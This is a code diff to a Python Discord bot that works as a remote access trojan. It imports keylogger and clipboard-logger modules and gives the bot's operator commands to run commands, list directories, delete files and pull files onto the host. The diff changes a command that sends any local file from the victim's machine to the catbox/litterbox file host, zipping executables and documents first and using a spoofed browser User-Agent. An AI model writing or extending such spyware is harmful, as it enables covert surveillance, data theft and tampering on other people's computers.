@@ -1,4 +1,4 @@
-import os, datetime, pyautogui, subprocess, requests, cv2, zipfile
+import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio
 import discord, io, aiohttp
 
 from Clip_logging import Cliplogger
@@ -6,7 +6,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKEN-SERVER'
+TOKEN = 'BOT-TOKEN'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -84,7 +84,7 @@ async def upload(ctx: commands.Context, url=None, local_file=None):
                     if chunk:
                         file.write(chunk)
 
-        await ctx.send("file is successfully uploaded")
+        await ctx.send(f"**file is successfully uploaded!**\n```\n{local_file}\n```")
     
     except requests.exceptions.HTTPError as e:
         await ctx.send(f"the server responded with status code: {res.status_code}\n```detail:\n{e}\n```")
@@ -102,62 +102,76 @@ async def upload(ctx: commands.Context, url=None, local_file=None):
         await ctx.send(f"{e}")
 
 @bot.command()
-async def download(ctx: commands.Context, file:str):
+async def download(ctx: commands.Context, file:str, time:str="24h"):
     if not os.path.exists(file):
         await ctx.send("file not found")
         return
 
-    url = "https://catbox.moe/user/api.php"
+    url = "https://litterbox.catbox.moe/resources/internals/api.php"
 
     file_dir = os.path.dirname(file)
     base_name = os.path.basename(file)
     name, ext = os.path.splitext(base_name)
 
     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-    
-    payload = aiohttp.FormData()
-    payload.add_field('reqtype', 'fileupload')
-    payload.add_field('userhash', '')
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    }
 
-    await ctx.send("processing file..")
+    result = await ctx.send("processing file..")
 
     try:
-        if ext.lower() in BANNED_EXTENSIONS:
-            zipname = f"{name}_{timestamp}.zip"
-            zippath = os.path.join(file_dir, zipname) if file_dir else zipname
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            if ext.lower() in BANNED_EXTENSIONS:
+                zipname = f"{name}_{timestamp}.zip"
+                zippath = os.path.join(file_dir, zipname) if file_dir else zipname
 
-            await ctx.send("bad extension detected, zipping it..")
+                await ctx.send("bad extension detected, zipping it..")
 
-            with zipfile.ZipFile(zippath, 'w', zipfile.ZIP_DEFLATED) as z:
-                z.write(file, base_name)
-            
-            await ctx.send("sending zipped file..")
+                with zipfile.ZipFile(zippath, 'w', zipfile.ZIP_DEFLATED) as z:
+                    z.write(file, base_name)
+                
+                await ctx.send("sending zipped file..")
+                
+                payload = aiohttp.FormData()
+                payload.add_field('reqtype', 'fileupload')
 
-            with open(zippath, 'rb') as zf:
-                payload.add_field('fileToUpload', zf, filename=zipname, content_type='application/zip')
-                async with aiohttp.ClientSession() as session:
-                    async with session.post(url, data=payload) as response:
+                if time:
+                    payload.add_field('time', time)
+
+                with open(zippath, 'rb') as zf:
+
+                    payload.add_field('fileToUpload', zf, filename=zipname, content_type='application/zip')
+
+                    async with session.post(url, data=payload, headers=headers) as response:
                         response_txt = await response.text()
                         statuscode = response.status
-                        
-            if os.path.exists(zippath):
-                os.remove(zippath)
-        else:
-            safename = f"{name}{ext}"
-            await ctx.send(f"downloading.. '{safename}'")
+                            
+                if os.path.exists(zippath):
+                    os.remove(zippath)
+            else:
+                safename = f"{base_name}"
+                await ctx.send(f"downloading.. '{safename}'")
 
-            with open(safename, 'rb') as f:
-                payload.add_field('fileToUpload', f, filename=safename)
+                payload = aiohttp.FormData()
+                payload.add_field('reqtype', 'fileupload')
 
-                async with aiohttp.ClientSession() as session:
-                    async with session.post(url, data=payload) as response:
+                if time:
+                    payload.add_field('time', time)
+
+                with open(safename, 'rb') as f:
+
+                    payload.add_field('fileToUpload', f, filename=safename)
+
+                    async with session.post(url, data=payload, headers=headers) as response:
                         response_txt = await response.text()
                         statuscode = response.status
 
         if statuscode == 200:
             await ctx.send(f"**file is ready to download!**\n```\n{response_txt}\n```")
         else:
-            await ctx.send(f"**failed to turn file into link**")
+            await ctx.send(f"**failed to turn file into link**```\nstatuscode:\n{statuscode}\n```")
     except Exception as e:
         await ctx.send(f"{e}")
 
@@ -216,33 +230,50 @@ async def exe(ctx: commands.Context,*, cmd: str = None):
 
 @bot.command()
 async def ls(ctx: commands.Context, *, path: str = '.'):
-    try:
-        path = os.path.abspath(path)
-        if not path:
-            raise FileNotFoundError(await ctx.send(f"directory not found '{path}'"))
+    def scan(target):
+            apath = os.path.abspath(target)
+            if not os.path.exists(apath):
+                raise FileNotFoundError(f"directory not found '{apath}'")
+            
+            folders = []
+            files = []
+            listdir = os.listdir(apath)
+
+            for item in listdir:
+                full_path = os.path.join(apath, item)
+
+                if os.path.isdir(full_path):
+                    folders.append(f" 📁 {item}")
+                else:
+                    files.append(f" 📄 {item}")
+            
+            return apath, folders, files
         
-        list = os.listdir(path)
-
-        folders = []
-        files = []
-
-        for item in list:
-            full_path = os.path.join(path, item)
-
-            if os.path.isdir(full_path):
-                folders.append(f" 📁 {item}")
-            else:
-                files.append(f" 📄 {item}")
+    try:
+        loop = asyncio.get_running_loop()
+        path, folders, files = await loop.run_in_executor(None, scan, path)
 
         folder = "\n".join(folders) if folders else "[NO FOLDER HERE]"
         file = "\n".join(files) if files else "[NO FILE HERE]"
+
+        content = (
+            f"Content of '{path}':\n\n"
+            f"--- FOLDERS ---\n{folder}\n\n"
+            f"--- FILES ---\n{file}"
+        )
 
         msg = (
             f"the content of '{path}':\n\n"
             f"**FOLDER:**\n```\n{folder}\n```\n"
             f"**FILE:**\n```\n{file}\n```"
         )
-        await ctx.send(msg)
+
+        if len(msg) <= 2000:
+            await ctx.send(msg)
+        else:
+            data = io.StringIO(content)
+            file = discord.File(fp=data, filename=f"ls_{os.path.basename(path) or 'root'}.txt")
+            await ctx.send(content=f"content of folder '{path}' is too long, sending it to a file", file=file)
 
     except TypeError:
         await ctx.send(f"the path must be string or a byte object")
@@ -251,6 +282,8 @@ async def ls(ctx: commands.Context, *, path: str = '.'):
     except OSError as e:
         await ctx.send(f"{e}")
     except FileNotFoundError as e:
+        await ctx.send(f"{e}")
+    except Exception as e:
         await ctx.send(f"{e}")
 
 @bot.command()
@@ -298,5 +331,21 @@ async def cd(ctx: commands.Context,*, path: str = None):
         await ctx.send(f"you have no permission to access '{path}' directory")
     except NotADirectoryError:
         await ctx.send(f"This is a file, not a directory")
+
+@bot.command()
+async def rmv(ctx: commands.Context, file:str=None):
+    try:
+        if file is None:
+            await ctx.send("enter a file you wanna remove")
+        else:
+            if os.path.exists(file) and os.path.isfile(file):
+                os.remove(file)
+                await ctx.send(f"file '{file}' has been removed")
+            else:
+                await ctx.send("file not found")
+    except PermissionError:
+        await ctx.send(f"you have no permission to remove file '{file}'")
+    except (OSError, Exception) as e:
+        await ctx.send(f"{e}")
 
 bot.run(TOKEN, reconnect=True)
